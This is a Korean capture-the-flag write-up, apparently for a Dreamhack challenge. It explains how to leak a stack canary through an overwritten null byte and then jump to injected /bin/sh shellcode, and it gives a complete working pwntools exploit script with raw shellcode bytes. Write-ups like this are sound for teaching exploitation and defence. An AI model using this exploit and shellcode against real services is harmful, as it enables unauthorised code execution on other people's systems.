# 문제명

## 문제 설명

> 이 문제는 Buffer Overflow와 Canary Bypass를 연계하여 스택에 직접 주입한 쉘코드를 실행하고 시스템의 쉘을 획득하는 문제입니다. 


## 풀이

### 분석
-체크섹(checksec)을 통해 컴파일된 바이너리의 보안 기법을 먼저 분석합니다.
Arch : x86-64 (64비트 환경)
Canary :Enabled (스택 오버플로우 방지를 위한 카나리가 적용되어 있음)
NX :Disabled (스택 영역에 실행 권한이 있으므로 쉘코드를 적재하여 실행할 수 있음)
ASLR : Enabled (메모리 주소가 실행 시마다 계속 무작위로 변경됨)


### 취약점
-Stack Buffer Overflow ->  buf 변수의 크기는 0x50(80바이트)이지만read 함수를 통해 0x100(256바이트)의 데이터를 입력받기 때문에 스택 영역을 덮어쓸 수 있는 오버플로우가 발생합니다. 64비트 시스템에서 카나리는 8바이트 크기이며 첫 번째 바이트는 항상 \x00(널 바이트)입니다. 문자열 출력 함수인 printf("%s")는 널 바이트를 만날 때까지만 출력합니다. 만약 1차 입력 시 버퍼(80바이트2)와 카나리의 널 바이트(1바이트)를 포함해 총 81바이트를 채운다면 \x00이 지워지면서 printf가 카나리 값 전체를 함께 화면에 출력하게 되는 메모리 릭 취약점이 존재합니다.

### 익스플로잇

첫 번째 입력 기회에 임의의 문자(A) 81개를 보냅니다. Your input is: 뒤에 출력되는 문자열에서 내가 보낸 81바이트 바로 뒤에 따라오는 7바이트를 수집하고 앞선 자리에 \x00을 강제로 붙여주어 카나리 원본 값을 복구해 냅니다. 두 번째 입력 기회에 [26바이트 shellcode] + [dummy padding(54바이트)] + [Leak된 Canary(8바이트)] + [SFP dummy(8바이트)] + [Leak된 buf_address(8바이트)] 구조의 페이로드를 조립해 보냅니다. 그러고 함수가 종료되는 순간 스택 카나리 무결성 검증을 정상적으로 통과하고 변경된 반환 주소(Return Address)에 의해 우리가 올린 buf_addr로 점프하여 쉘코드가 실행됩니다.

```python
from pwn import *

p = remote('host3.dreamhack.games', 23525)

p.recvuntil(b"Address of the buf: ")
buf_addr = int(p.recvline().strip(), 16)
log.info(f"Leaked buf Address: {hex(buf_addr)}")

payload_leak = b"A" * 81
p.sendafter(b"Input: ", payload_leak)

p.recvuntil(payload_leak)
canary = u64(b"\x00" + p.recv(7))
log.info(f"Leaked Canary: {hex(canary)}")

shellcode = b"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"

payload_exp = shellcode
payload_exp += b"A" * (80 - len(shellcode))
payload_exp += p64(canary)  
payload_exp += b"B" * 8                    
payload_exp += p64(buf_addr)               

p.sendafter(b"Input: ", payload_exp)
p.interactive()
```

## 배운 점
- 카나리가 적용되어 있어도 출력 함수와 입력 버퍼 크기의 허점을 이용하면 카나리의 널 바이트(\x00)를 덮어씌움으로써 뒤의 난수 영역을 유출할 수 있다는 것을 배웠습니다. 그리고 주소 무작위화가 적용되어 메모리 배치가 매번 바뀌더라도 바이너리가 포인터 주소를 한 번이라도 직접 노출해 주면 이를 기준으로 공격 주소를 동적으로 연산할 수 있음을 체감했습니다. 스택 영역에 실행 권한이 남아있지 않다면 아무리 주소를 알아내고 쉘코드를 잘 올렸더라도 동작하지 않는다는 점을 인지하며 시스템 보안 컴파일러 옵션의 동작 메커니즘을 더 자세히 공부해야겠다고 느꼈습니다.
